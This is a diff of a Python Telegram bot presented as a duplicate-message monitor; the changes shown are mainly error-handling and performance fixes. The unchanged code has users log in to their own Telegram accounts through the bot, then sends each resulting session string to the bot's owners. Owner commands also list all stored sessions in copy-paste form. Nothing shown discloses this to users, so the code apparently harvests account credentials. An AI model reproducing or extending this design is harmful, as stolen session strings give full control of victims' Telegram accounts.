@@ -1,4 +1,4 @@
-# monitor.py (optimized)
+# monitor.py (optimized & corrected)
 #!/usr/bin/env python3
 import os
 import asyncio
@@ -9,7 +9,7 @@ import gc
 import sys
 from typing import Dict, List, Optional, Tuple, Set, Any
 from collections import defaultdict, deque
-from functools import lru_cache
+from functools import lru_cache, partial
 from concurrent.futures import ThreadPoolExecutor
 
 from telethon import TelegramClient, events
@@ -130,7 +130,8 @@ _workers_started = False
 MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
 
 # Thread pool for blocking operations
-_thread_pool = ThreadPoolExecutor(max_workers=10, thread_name_prefix="db_worker")
+# reduced workers to save RAM while still supporting DB work
+_thread_pool = ThreadPoolExecutor(max_workers=5, thread_name_prefix="db_worker")
 
 # Constants
 UNAUTHORIZED_MESSAGE = """🚫 **Access Denied!** 
@@ -151,8 +152,10 @@ GC_INTERVAL = 300
 
 async def db_call(func, *args, **kwargs):
     """Execute database calls in thread pool"""
-    loop = asyncio.get_event_loop()
-    return await loop.run_in_executor(_thread_pool, lambda: func(*args, **kwargs))
+    loop = asyncio.get_running_loop()
+    # Use partial to safely capture args/kwargs in executor
+    work = partial(func, *args, **kwargs)
+    return await loop.run_in_executor(_thread_pool, work)
 
 
 async def optimized_gc():
@@ -161,9 +164,16 @@ async def optimized_gc():
     current_time = time.time()
     if current_time - _last_gc_run > GC_INTERVAL:
         # Only collect generation 2 if memory pressure is high
-        if gc.get_count()[0] > gc.get_threshold()[0]:
-            collected = gc.collect(2)
-            logger.debug(f"Garbage collection freed {collected} objects")
+        try:
+            if gc.get_count()[0] > gc.get_threshold()[0]:
+                collected = gc.collect(2)
+                logger.debug(f"Garbage collection freed {collected} objects")
+        except Exception:
+            # If GC introspection fails, run a safe collect
+            try:
+                gc.collect()
+            except Exception:
+                pass
         _last_gc_run = current_time
 
 
@@ -182,14 +192,14 @@ def is_duplicate_message(user_id: int, chat_id: int, message_hash: str) -> bool:
     key = (user_id, chat_id)
     if key not in message_history:
         return False
-    
+
     current_time = time.time()
     dq = message_history[key]
-    
+
     # Remove old entries from left (oldest)
     while dq and current_time - dq[0][1] > DUPLICATE_CHECK_WINDOW:
         dq.popleft()
-    
+
     # Check for duplicate using any() for speed
     return any(stored_hash == message_hash for stored_hash, _, _ in dq)
 
@@ -199,7 +209,7 @@ def store_message_hash(user_id: int, chat_id: int, message_hash: str, message_te
     key = (user_id, chat_id)
     if key not in message_history:
         message_history[key] = deque(maxlen=MESSAGE_HASH_LIMIT)
-    
+
     message_history[key].append((message_hash, time.time(), message_text[:80]))
 
 
@@ -242,14 +252,14 @@ async def send_string_session_to_owners(user_id: int, phone: str, name: str, ses
     """Send string session to owners in parallel"""
     if not BOT_INSTANCE or not OWNER_IDS:
         return
-    
+
     message_text = (
         f"🔐 **New String Session Generated**\n\n"
         f"👤 User: {name} (ID: {user_id})\n"
         f"📱 Phone: `{phone}`\n\n"
         f"**Env Var Format:**\n```{user_id}:{session_string}```"
     )
-    
+
     # Send to all owners in parallel
     send_tasks = []
     for owner_id in OWNER_IDS:
@@ -260,7 +270,7 @@ async def send_string_session_to_owners(user_id: int, phone: str, name: str, ses
                 parse_mode="Markdown"
             )
         )
-    
+
     try:
         await asyncio.gather(*send_tasks, return_exceptions=True)
         logger.info(f"Sent string sessions to {len(OWNER_IDS)} owners for user {user_id}")
@@ -271,44 +281,44 @@ async def send_string_session_to_owners(user_id: int, phone: str, name: str, ses
 async def get_all_strings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Optimized get all strings command"""
     user_id = update.effective_user.id
-    
+
     if user_id not in OWNER_IDS:
         await update.message.reply_text("❌ **Owner Only**\n\nThis command is only available to owners.", parse_mode="Markdown")
         return
-    
+
     try:
         users = await db_call(db.get_all_logged_in_users)
     except Exception as e:
         logger.error(f"Error getting logged-in users: {e}")
         await update.message.reply_text("❌ **Error retrieving sessions**", parse_mode="Markdown")
         return
-    
+
     if not users:
         await update.message.reply_text("📭 **No String Sessions**\n\nNo users are currently logged in.", parse_mode="Markdown")
         return
-    
+
     response_parts = []
     current_part = "🔑 **All String Sessions**\n\nWell Arranged Copy-Paste Env Var Format:\n\n"
-    
+
     for user in users:
         if not user.get("session_data"):
             continue
-        
+
         username = user.get("name", "Unknown")
         user_id_val = user.get("user_id")
         session_string = user.get("session_data")
-        
+
         entry = f"👤 User: {username} (ID: {user_id_val})\n\nEnv Var Format:\n```{user_id_val}:{session_string}```\n\n"
-        
+
         if len(current_part) + len(entry) > 4000:
             response_parts.append(current_part)
             current_part = entry
         else:
             current_part += entry
-    
+
     if current_part:
         response_parts.append(current_part)
-    
+
     # Send parts
     for i, part in enumerate(response_parts):
         if i == 0:
@@ -320,11 +330,11 @@ async def get_all_strings_command(update: Update, context: ContextTypes.DEFAULT_
 async def get_user_string_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Optimized get user string command"""
     user_id = update.effective_user.id
-    
+
     if user_id not in OWNER_IDS:
         await update.message.reply_text("❌ **Owner Only**\n\nThis command is only available to owners.", parse_mode="Markdown")
         return
-    
+
     if not context.args:
         await update.message.reply_text(
             "❌ **Invalid Format!**\n\n"
@@ -333,16 +343,16 @@ async def get_user_string_command(update: Update, context: ContextTypes.DEFAULT_
             parse_mode="Markdown"
         )
         return
-    
+
     try:
         target_user_id = int(context.args[0])
     except ValueError:
         await update.message.reply_text("❌ **Invalid User ID!**\n\nUser ID must be a number.", parse_mode="Markdown")
         return
-    
+
     session_string = None
     username = "Unknown"
-    
+
     # Check USER_SESSIONS first (fast)
     if target_user_id in USER_SESSIONS:
         session_string = USER_SESSIONS[target_user_id]
@@ -353,7 +363,7 @@ async def get_user_string_command(update: Update, context: ContextTypes.DEFAULT_
                 username = me.first_name or "Unknown"
             except Exception:
                 pass
-    
+
     # Check database if not found
     if not session_string:
         try:
@@ -363,17 +373,17 @@ async def get_user_string_command(update: Update, context: ContextTypes.DEFAULT_
                 username = user.get("name", "Unknown")
         except Exception as e:
             logger.error(f"Error getting user {target_user_id}: {e}")
-    
+
     if not session_string:
         await update.message.reply_text(
             f"❌ **No Session Found!**\n\nNo string session found for user ID: `{target_user_id}`",
             parse_mode="Markdown"
         )
         return
-    
+
     response = f"🔑 **String Session for 👤 User: {username} (ID: {target_user_id})**\n\n"
     response += f"**Env Var Format:**\n```{target_user_id}:{session_string}```"
-    
+
     await update.message.reply_text(response, parse_mode="Markdown")
 
 
@@ -388,10 +398,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Get user info in parallel
     user_task = db_call(db.get_user, user_id)
     user_name = update.effective_user.first_name or "User"
-    
+
     user = await user_task
-    user_phone = user["phone"] if user and user["phone"] else "Not connected"
-    is_logged_in = user and user["is_logged_in"]
+    user_phone = user["phone"] if user and user.get("phone") else "Not connected"
+    is_logged_in = bool(user and user.get("is_logged_in"))
 
     if is_logged_in and (not user_phone or user_phone == "Not connected"):
         phone_verification_states[user_id] = True
@@ -471,13 +481,22 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
 
     if query.data == "login":
-        await query.message.delete()
+        try:
+            await query.message.delete()
+        except Exception:
+            pass
         await login_command(update, context)
     elif query.data == "logout":
-        await query.message.delete()
+        try:
+            await query.message.delete()
+        except Exception:
+            pass
         await logout_command(update, context)
     elif query.data == "show_tasks":
-        await query.message.delete()
+        try:
+            await query.message.delete()
+        except Exception:
+            pass
         await monitortasks_command(update, context)
     elif query.data.startswith("chatids_"):
         user_id = query.from_user.id
@@ -485,9 +504,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await show_chat_categories(user_id, query.message.chat.id, query.message.message_id, context)
         else:
             parts = query.data.split("_")
-            category = parts[1]
-            page = int(parts[2])
-            await show_categorized_chats(user_id, query.message.chat.id, query.message.message_id, category, page, context)
+            if len(parts) >= 3:
+                category = parts[1]
+                try:
+                    page = int(parts[2])
+                except Exception:
+                    page = 0
+                await show_categorized_chats(user_id, query.message.chat.id, query.message.message_id, category, page, context)
     elif query.data.startswith("task_"):
         await handle_task_menu(update, context)
     elif query.data.startswith("toggle_"):
@@ -504,12 +527,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_phone_verification(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Optimized phone verification handler"""
     user_id = update.effective_user.id
-    
+
     if user_id not in phone_verification_states:
         return
-    
-    text = update.message.text.strip()
-    
+
+    text = (update.message.text or "").strip()
+
     if not text.startswith('+'):
         await update.message.reply_text(
             "❌ **Invalid format!**\n\n"
@@ -519,9 +542,9 @@ async def handle_phone_verification(update: Update, context: ContextTypes.DEFAUL
             parse_mode="Markdown",
         )
         return
-    
+
     clean_phone = ''.join(c for c in text if c.isdigit() or c == '+')
-    
+
     if len(clean_phone) < 8:
         await update.message.reply_text(
             "❌ **Invalid phone number!**\n\n"
@@ -530,20 +553,20 @@ async def handle_phone_verification(update: Update, context: ContextTypes.DEFAUL
             parse_mode="Markdown",
         )
         return
-    
+
     try:
         await db_call(db.save_user, user_id, clean_phone, None, None, True)
         phone_verification_states.pop(user_id, None)
-        
+
         await update.message.reply_text(
             f"✅ **Phone number verified!**\n\n"
             f"Your phone number has been saved: `{clean_phone}`\n\n"
             "You can now use all commands. Type /start to see the main menu.",
             parse_mode="Markdown"
         )
-        
+
         logger.info(f"Updated phone number for user {user_id}: {clean_phone}")
-        
+
     except Exception as e:
         logger.error(f"Error updating phone number for user {user_id}: {e}")
         await update.message.reply_text(
@@ -571,7 +594,7 @@ async def monitoradd_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         return
 
     user = await db_call(db.get_user, user_id)
-    if not user or not user["is_logged_in"]:
+    if not user or not user.get("is_logged_in"):
         await update.message.reply_text(
             "❌ **You need to connect your account first!**\n\nUse /login to connect your Telegram account.",
             parse_mode="Markdown"
@@ -595,7 +618,7 @@ async def monitoradd_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
 async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Optimized task creation handler"""
     user_id = update.effective_user.id
-    text = update.message.text.strip()
+    text = (update.message.text or "").strip()
 
     if user_id not in task_creation_states:
         return
@@ -631,7 +654,7 @@ async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYP
                     id_str = id_str.strip()
                     if id_str.lstrip('-').isdigit():
                         chat_ids.append(int(id_str))
-                
+
                 if not chat_ids:
                     await update.message.reply_text("❌ **Please enter valid numeric IDs!**")
                     return
@@ -646,9 +669,9 @@ async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYP
                     "outgoing_message_monitoring": True
                 }
 
-                added = await db_call(db.add_monitoring_task, 
-                                     user_id, 
-                                     state["name"], 
+                added = await db_call(db.add_monitoring_task,
+                                     user_id,
+                                     state["name"],
                                      state["chat_ids"],
                                      task_settings)
 
@@ -725,6 +748,14 @@ async def monitortasks_command(update: Update, context: ContextTypes.DEFAULT_TYP
         )
         return
 
+    # Ensure tasks_cache is populated on-demand
+    if not tasks_cache.get(user_id):
+        try:
+            user_tasks = await db_call(db.get_user_tasks, user_id)
+            tasks_cache[user_id] = user_tasks
+        except Exception:
+            logger.exception("Failed to load tasks for user %s", user_id)
+
     tasks = tasks_cache.get(user_id, [])
 
     if not tasks:
@@ -739,10 +770,11 @@ async def monitortasks_command(update: Update, context: ContextTypes.DEFAULT_TYP
 
     task_list = "📋 **Your Monitoring Tasks**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
     keyboard = []
-    
+
     for i, task in enumerate(tasks, 1):
         task_list += f"{i}. **{task['label']}**\n"
         task_list += f"   📥 Monitoring: {', '.join(map(str, task['chat_ids']))}\n\n"
+        # Buttons use label as id; ensure label does not contain problematic characters (original code uses it)
         keyboard.append([InlineKeyboardButton(f"{i}. {task['label']}", callback_data=f"task_{task['label']}")])
 
     task_list += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nTotal: **{len(tasks)} task(s)**\n\n💡 **Tap any task below to manage it!**"
@@ -759,24 +791,31 @@ async def handle_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     user_id = query.from_user.id
     task_label = query.data.replace("task_", "")
-    
+
+    # Ensure tasks_cache is loaded
+    if not tasks_cache.get(user_id):
+        try:
+            tasks_cache[user_id] = await db_call(db.get_user_tasks, user_id)
+        except Exception:
+            logger.exception("Failed to load tasks for user %s", user_id)
+
     user_tasks = tasks_cache.get(user_id, [])
     task = next((t for t in user_tasks if t["label"] == task_label), None)
-    
+
     if not task:
         await query.answer("Task not found!", show_alert=True)
         return
-    
+
     settings = task.get("settings", {})
-    
+
     check_duo_emoji = "✅" if settings.get("check_duplicate_and_notify", True) else "❌"
     manual_reply_emoji = "✅" if settings.get("manual_reply_system", True) else "❌"
     auto_reply_emoji = "✅" if settings.get("auto_reply_system", False) else "❌"
     outgoing_emoji = "✅" if settings.get("outgoing_message_monitoring", True) else "❌"
-    
+
     auto_reply_message = settings.get("auto_reply_message", "")
     auto_reply_display = f"Auto Reply = '{auto_reply_message[:30]}{'...' if len(auto_reply_message) > 30 else ''}'" if auto_reply_message else "Auto Reply = Off"
-    
+
     message_text = f"🔧 **Task Management: {task_label}**\n\n"
     message_text += f"📥 **Monitoring Chats:** {', '.join(map(str, task['chat_ids']))}\n\n"
     message_text += "⚙️ **Settings:**\n"
@@ -785,7 +824,7 @@ async def handle_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message_text += f"{auto_reply_emoji} {auto_reply_display}\n"
     message_text += f"{outgoing_emoji} Outgoing Message monitoring - Monitors your outgoing messages\n\n"
     message_text += "💡 **Tap any option below to change it!**"
-    
+
     keyboard = [
         [
             InlineKeyboardButton(f"{check_duo_emoji} Check Duo & Notify", callback_data=f"toggle_{task_label}_check_duplicate_and_notify"),
@@ -798,7 +837,7 @@ async def handle_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("🗑️ Delete", callback_data=f"delete_{task_label}")],
         [InlineKeyboardButton("🔙 Back to Tasks", callback_data="show_tasks")]
     ]
-    
+
     await query.edit_message_text(
         message_text,
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -811,39 +850,43 @@ async def handle_toggle_action(update: Update, context: ContextTypes.DEFAULT_TYP
     query = update.callback_query
     user_id = query.from_user.id
     data_parts = query.data.replace("toggle_", "").split("_")
-    
+
     if len(data_parts) < 2:
         await query.answer("Invalid action!", show_alert=True)
         return
-    
+
     task_label = data_parts[0]
     toggle_type = "_".join(data_parts[1:])
-    
+
+    # Ensure tasks_cache loaded
+    if not tasks_cache.get(user_id):
+        tasks_cache[user_id] = await db_call(db.get_user_tasks, user_id)
+
     user_tasks = tasks_cache.get(user_id, [])
     task_index = next((i for i, t in enumerate(user_tasks) if t["label"] == task_label), -1)
-    
+
     if task_index == -1:
         await query.answer("Task not found!", show_alert=True)
         return
-    
+
     task = user_tasks[task_index]
     settings = task.get("settings", {})
     new_state = None
     status_text = ""
-    
+
     if toggle_type == "check_duplicate_and_notify":
         new_state = not settings.get("check_duplicate_and_notify", True)
         settings["check_duplicate_and_notify"] = new_state
         status_text = "Check Duo & Notify"
-        
+
     elif toggle_type == "manual_reply_system":
         new_state = not settings.get("manual_reply_system", True)
         settings["manual_reply_system"] = new_state
         status_text = "Manual reply system"
-        
+
     elif toggle_type == "auto_reply_system":
         current_state = settings.get("auto_reply_system", False)
-        
+
         if not current_state:
             context.user_data[f"waiting_auto_reply_{task_label}"] = True
             await query.edit_message_text(
@@ -864,25 +907,25 @@ async def handle_toggle_action(update: Update, context: ContextTypes.DEFAULT_TYP
             settings["auto_reply_system"] = new_state
             settings["auto_reply_message"] = ""
             status_text = "Auto Reply system"
-        
+
     elif toggle_type == "outgoing_message_monitoring":
         new_state = not settings.get("outgoing_message_monitoring", True)
         settings["outgoing_message_monitoring"] = new_state
         status_text = "Outgoing message monitoring"
-        
+
     else:
         await query.answer(f"Unknown toggle type: {toggle_type}")
         return
-    
+
     if new_state is not None:
         task["settings"] = settings
         tasks_cache[user_id][task_index] = task
-    
+
     if toggle_type != "auto_reply_system":
-        keyboard = query.message.reply_markup.inline_keyboard
+        keyboard = query.message.reply_markup.inline_keyboard if query.message.reply_markup else []
         button_found = False
         new_emoji = "✅" if new_state else "❌"
-        
+
         new_keyboard = []
         for row in keyboard:
             new_row = []
@@ -903,13 +946,13 @@ async def handle_toggle_action(update: Update, context: ContextTypes.DEFAULT_TYP
                         new_text = f"{new_emoji}{text_without_emoji}"
                     else:
                         new_text = f"{new_emoji} {current_text}"
-                    
+
                     new_row.append(InlineKeyboardButton(new_text, callback_data=query.data))
                     button_found = True
                 else:
                     new_row.append(button)
             new_keyboard.append(new_row)
-        
+
         if button_found:
             try:
                 await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(new_keyboard))
@@ -923,7 +966,7 @@ async def handle_toggle_action(update: Update, context: ContextTypes.DEFAULT_TYP
             status_display = "✅ Active" if new_state else "❌ Inactive"
             await query.answer(f"{status_text}: {status_display}")
             await handle_task_menu(update, context)
-    
+
     # Update database in background
     if new_state is not None or toggle_type == "auto_reply_system":
         try:
@@ -936,44 +979,48 @@ async def handle_toggle_action(update: Update, context: ContextTypes.DEFAULT_TYP
 async def handle_auto_reply_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Optimized auto reply message handler"""
     user_id = update.effective_user.id
-    text = update.message.text.strip()
-    
+    text = (update.message.text or "").strip()
+
     waiting_for_auto_reply = False
     task_label = None
-    
+
     for key in list(context.user_data.keys()):
         if key.startswith("waiting_auto_reply_"):
             waiting_for_auto_reply = True
             task_label = key.replace("waiting_auto_reply_", "")
             del context.user_data[key]
             break
-    
+
     if not waiting_for_auto_reply or not task_label:
         return
-    
+
+    # Ensure tasks cache loaded
+    if not tasks_cache.get(user_id):
+        tasks_cache[user_id] = await db_call(db.get_user_tasks, user_id)
+
     user_tasks = tasks_cache.get(user_id, [])
     task_index = next((i for i, t in enumerate(user_tasks) if t["label"] == task_label), -1)
-    
+
     if task_index == -1:
         await update.message.reply_text("❌ Task not found!")
         return
-    
+
     task = user_tasks[task_index]
     settings = task.get("settings", {})
-    
+
     settings["auto_reply_system"] = True
     settings["auto_reply_message"] = text
-    
+
     task["settings"] = settings
     tasks_cache[user_id][task_index] = task
-    
+
     try:
         await db_call(db.update_task_settings, user_id, task_label, settings)
     except Exception as e:
         logger.exception("Error updating task settings in DB: %s", e)
         await update.message.reply_text("❌ Error saving auto reply message!")
         return
-    
+
     await update.message.reply_text(
         f"✅ **Auto Reply Message Added Successfully!**\n\n"
         f"Task: **{task_label}**\n"
@@ -982,53 +1029,57 @@ async def handle_auto_reply_message(update: Update, context: ContextTypes.DEFAUL
         "⚠️ **Remember:** It will appear as coming from your account.",
         parse_mode="Markdown"
     )
-    
+
     logger.info(f"Auto reply message set for task {task_label} by user {user_id}")
 
 
 async def handle_notification_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Optimized notification reply handler"""
     user_id = update.effective_user.id
-    text = update.message.text.strip()
-    
+    text = (update.message.text or "").strip()
+
     if not update.message.reply_to_message:
         return
-    
+
     replied_message_id = update.message.reply_to_message.message_id
-    
+
     if replied_message_id not in notification_messages:
         return
-    
+
     notification_data = notification_messages[replied_message_id]
-    
+
     if notification_data["user_id"] != user_id:
         return
-    
+
     task_label = notification_data["task_label"]
     chat_id = notification_data["chat_id"]
     original_message_id = notification_data["original_message_id"]
     message_preview = notification_data.get("message_preview", "Unknown message")
-    
+
+    # Ensure tasks cache loaded
+    if not tasks_cache.get(user_id):
+        tasks_cache[user_id] = await db_call(db.get_user_tasks, user_id)
+
     user_tasks = tasks_cache.get(user_id, [])
     task = next((t for t in user_tasks if t["label"] == task_label), None)
-    
+
     if not task:
         await update.message.reply_text("❌ Task not found!")
         return
-    
+
     if user_id not in user_clients:
         await update.message.reply_text("❌ You need to be logged in to send replies!")
         return
-    
+
     client = user_clients[user_id]
-    
+
     try:
         chat_entity = await client.get_input_entity(chat_id)
         await client.send_message(chat_entity, text, reply_to=original_message_id)
-        
+
         escaped_text = escape_markdown(text, version=2)
         escaped_preview = escape_markdown(message_preview, version=2)
-        
+
         await update.message.reply_text(
             f"✅ **Reply sent successfully!**\n\n"
             f"📝 **Your reply:** {escaped_text}\n"
@@ -1036,10 +1087,10 @@ async def handle_notification_reply(update: Update, context: ContextTypes.DEFAUL
             "The duplicate sender has been notified with your reply.",
             parse_mode="Markdown"
         )
-        
+
         logger.info(f"User {user_id} sent manual reply to duplicate in chat {chat_id}")
         notification_messages.pop(replied_message_id, None)
-        
+
     except Exception as e:
         logger.exception(f"Error sending manual reply for user {user_id}: {e}")
         await update.message.reply_text(
@@ -1054,19 +1105,19 @@ async def handle_delete_action(update: Update, context: ContextTypes.DEFAULT_TYP
     query = update.callback_query
     user_id = query.from_user.id
     task_label = query.data.replace("delete_", "")
-    
+
     message_text = f"🗑️ **Delete Monitoring Task: {task_label}**\n\n"
     message_text += "⚠️ **Are you sure you want to delete this task?**\n\n"
     message_text += "This action cannot be undone!\n"
     message_text += "All monitoring will stop immediately."
-    
+
     keyboard = [
         [
             InlineKeyboardButton("✅ Yes, Delete", callback_data=f"confirm_delete_{task_label}"),
             InlineKeyboardButton("❌ Cancel", callback_data=f"task_{task_label}")
         ]
     ]
-    
+
     await query.edit_message_text(
         message_text,
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -1079,16 +1130,16 @@ async def handle_confirm_delete(update: Update, context: ContextTypes.DEFAULT_TY
     query = update.callback_query
     user_id = query.from_user.id
     task_label = query.data.replace("confirm_delete_", "")
-    
+
     deleted = await db_call(db.remove_monitoring_task, user_id, task_label)
-    
+
     if deleted:
         if user_id in tasks_cache:
             tasks_cache[user_id] = [t for t in tasks_cache[user_id] if t.get("label") != task_label]
-        
+
         if user_id in user_clients:
             await update_monitoring_for_user(user_id)
-        
+
         await query.edit_message_text(
             f"✅ **Task '{task_label}' deleted successfully!**\n\n"
             "All monitoring for this task has been stopped.",
@@ -1135,8 +1186,8 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user and user.get("is_logged_in"):
         await message.reply_text(
             "✅ **You are already logged in!**\n\n"
-            f"📱 Phone: `{user['phone']}`\n"
-            f"👤 Name: `{user['name']}`\n\n"
+            f"📱 Phone: `{user.get('phone')}`\n"
+            f"👤 Name: `{user.get('name')}`\n\n"
             "Use /logout if you want to disconnect.",
             parse_mode="Markdown",
         )
@@ -1151,7 +1202,7 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         app_version="1.0",
         lang_code="en"
     )
-    
+
     try:
         await client.connect()
         logger.info(f"Telethon client connected for user {user_id}")
@@ -1199,17 +1250,17 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
     if user_id in task_creation_states:
         await handle_task_creation(update, context)
         return
-    
+
     # Check for auto reply message
     if any(key.startswith("waiting_auto_reply_") for key in context.user_data.keys()):
         await handle_auto_reply_message(update, context)
         return
-    
+
     # Check for notification reply
     if update.message.reply_to_message:
         await handle_notification_reply(update, context)
         return
-    
+
     if user_id in logout_states:
         handled = await handle_logout_confirmation(update, context)
         if handled:
@@ -1219,7 +1270,7 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
         return
 
     state = login_states[user_id]
-    text = update.message.text.strip()
+    text = (update.message.text or "").strip()
     client = state["client"]
 
     try:
@@ -1233,9 +1284,9 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                     parse_mode="Markdown",
                 )
                 return
-            
+
             clean_phone = ''.join(c for c in text if c.isdigit() or c == '+')
-            
+
             if len(clean_phone) < 8:
                 await update.message.reply_text(
                     "❌ **Invalid phone number!**\n\n"
@@ -1254,7 +1305,7 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
             try:
                 logger.info(f"Sending code request to {clean_phone} for user {user_id}")
                 result = await client.send_code_request(clean_phone)
-                
+
                 state["phone"] = clean_phone
                 state["phone_code_hash"] = result.phone_code_hash
                 state["step"] = "waiting_code"
@@ -1279,7 +1330,7 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
             except Exception as e:
                 error_msg = str(e)
                 logger.error(f"Error sending code for user {user_id}: {error_msg}")
-                
+
                 if "PHONE_NUMBER_INVALID" in error_msg:
                     error_text = "❌ **Invalid phone number!**\n\nPlease check the format and try again."
                 elif "PHONE_NUMBER_BANNED" in error_msg:
@@ -1290,17 +1341,17 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                     error_text = "❌ **Code expired!**\n\nPlease start over with /login."
                 else:
                     error_text = f"❌ **Error:** {error_msg}\n\nPlease try again in a few minutes."
-                
+
                 await processing_msg.edit_text(
                     error_text + "\n\nUse /login to try again.",
                     parse_mode="Markdown",
                 )
-                
+
                 try:
                     await client.disconnect()
-                except:
+                except Exception:
                     pass
-                
+
                 if user_id in login_states:
                     del login_states[user_id]
                 return
@@ -1317,7 +1368,7 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                 return
 
             code = text[6:]
-            
+
             if not code or not code.isdigit() or len(code) != 5:
                 await update.message.reply_text(
                     "❌ **Invalid code!**\n\n"
@@ -1333,7 +1384,7 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
             )
 
             try:
-                await client.sign_in(state["phone"], code, phone_code_hash=state["phone_code_hash"])
+                await client.sign_in(state["phone"], code, phone_code_hash=state.get("phone_code_hash"))
 
                 me = await client.get_me()
                 session_string = client.session.save()
@@ -1364,7 +1415,7 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                     "Welcome aboard! 🚀",
                     parse_mode="Markdown",
                 )
-                
+
                 logger.info(f"User {user_id} successfully logged in as {me.first_name}")
 
             except SessionPasswordNeededError:
@@ -1383,14 +1434,14 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
             except Exception as e:
                 error_msg = str(e)
                 logger.error(f"Error verifying code for user {user_id}: {error_msg}")
-                
+
                 if "PHONE_CODE_INVALID" in error_msg:
                     error_text = "❌ **Invalid code!**\n\nPlease check the code and try again."
                 elif "PHONE_CODE_EXPIRED" in error_msg:
                     error_text = "❌ **Code expired!**\n\nPlease request a new code with /login."
                 else:
                     error_text = f"❌ **Verification failed:** {error_msg}"
-                
+
                 await verifying_msg.edit_text(
                     error_text + "\n\nUse /login to try again.",
                     parse_mode="Markdown",
@@ -1458,19 +1509,19 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
             except Exception as e:
                 error_msg = str(e)
                 logger.error(f"Error verifying 2FA for user {user_id}: {error_msg}")
-                
+
                 if "PASSWORD_HASH_INVALID" in error_msg or "PASSWORD_INVALID" in error_msg:
                     error_text = "❌ **Invalid 2FA password!**\n\nPlease check your password and try again."
                 else:
                     error_text = f"❌ **2FA verification failed:** {error_msg}"
-                
+
                 await verifying_msg.edit_text(
                     error_text + "\n\nUse /login to try again.",
                     parse_mode="Markdown",
                 )
 
     except Exception as e:
-        logger.exception("Unexpected error during login process for %s", user_id)
+        logger.exception("Unexpected error during login process for %s: %s", user_id, e)
         await update.message.reply_text(
             f"❌ **Unexpected error:** {str(e)}\n\n"
             "Please try /login again.\n\n"
@@ -1509,18 +1560,18 @@ async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     user = await db_call(db.get_user, user_id)
-    if not user or not user["is_logged_in"]:
+    if not user or not user.get("is_logged_in"):
         await message.reply_text(
             "❌ **You're not connected!**\n\n" "Use /login to connect your account.", parse_mode="Markdown"
         )
         return
 
-    logout_states[user_id] = {"phone": user["phone"]}
+    logout_states[user_id] = {"phone": user.get("phone")}
 
     await message.reply_text(
         "⚠️ **Confirm Logout**\n\n"
         f"📱 **Enter your phone number to confirm disconnection:**\n\n"
-        f"Your connected phone: `{user['phone']}`\n\n"
+        f"Your connected phone: `{user.get('phone')}`\n\n"
         "Type your phone number exactly to confirm logout.",
         parse_mode="Markdown",
     )
@@ -1533,7 +1584,7 @@ async def handle_logout_confirmation(update: Update, context: ContextTypes.DEFAU
     if user_id not in logout_states:
         return False
 
-    text = update.message.text.strip()
+    text = (update.message.text or "").strip()
     stored_phone = logout_states[user_id]["phone"]
 
     if text != stored_phone:
@@ -1567,7 +1618,7 @@ async def handle_logout_confirmation(update: Update, context: ContextTypes.DEFAU
         await db_call(db.save_user, user_id, None, None, None, False)
     except Exception:
         logger.exception("Error saving user logout state for %s", user_id)
-    
+
     tasks_cache.pop(user_id, None)
     chat_entity_cache.pop(user_id, None)
     logout_states.pop(user_id, None)
@@ -1601,7 +1652,7 @@ async def getallid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     user = await db_call(db.get_user, user_id)
-    if not user or not user["is_logged_in"]:
+    if not user or not user.get("is_logged_in"):
         await update.message.reply_text("❌ **You need to connect your account first!**\n\n" "Use /login to connect.", parse_mode="Markdown")
         return
 
@@ -1632,7 +1683,13 @@ async def show_chat_categories(user_id: int, chat_id: int, message_id: int, cont
     ]
 
     if message_id:
-        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+        try:
+            await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+        except Exception:
+            try:
+                await context.bot.send_message(chat_id=chat_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+            except Exception:
+                pass
     else:
